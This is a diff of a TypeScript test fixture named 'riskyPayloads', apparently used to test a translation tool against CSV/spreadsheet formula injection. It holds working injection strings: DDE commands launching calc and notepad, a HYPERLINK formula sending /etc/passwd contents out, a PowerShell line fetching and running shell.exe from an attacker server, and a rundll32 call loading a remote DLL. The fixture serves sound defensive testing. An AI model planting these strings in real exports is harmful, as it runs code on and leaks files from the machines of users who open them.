@@ -29,28 +29,36 @@ export const simpleFormatFixture: IntermediateTranslationFormat = {
 export const riskyPayloads: IntermediateTranslationFormat = {
   translations: [
     {
-      term: 'DDE ("cmd";"/C calc";"!A0")A0',
-      translation: 'first',
+      term: `=HYPERLINK('https://www.google.com', 'Google')`,
+      translation: 'hyperlink function in excel',
+    },
+    {
+      term: `=HYPERLINK(CONCATENATE('http://0.0.0.0:80/123.txt?v='; ('file:///etc/passwd'#$passwd.A1)); 'test-poc')`,
+      translation: 'hyperlink concatenate function in csv',
+    },
+    {
+      term: `=cmd|' /C calc'!A0`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
     },
     {
       term: `@SUM(1+9)*cmd|' /C calc'!A0`,
-      translation: `second`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
     },
     {
       term: `=10+20+cmd|' /C calc'!A0`,
-      translation: `third`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
     },
     {
       term: `=cmd|' /C notepad'!'A1'`,
-      translation: `fourth`,
+      translation: 'to open the calculator application on the target machine (notepad automatic open command)',
     },
     {
       term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
-      translation: `fifth`,
+      translation: 'wget attacker server shell',
     },
     {
-      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1));"test-poc")`,
-      translation: `sixth`,
+      term: `=cmd|'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1`,
+      translation: 'rundll32 extension',
     },
   ],
 };
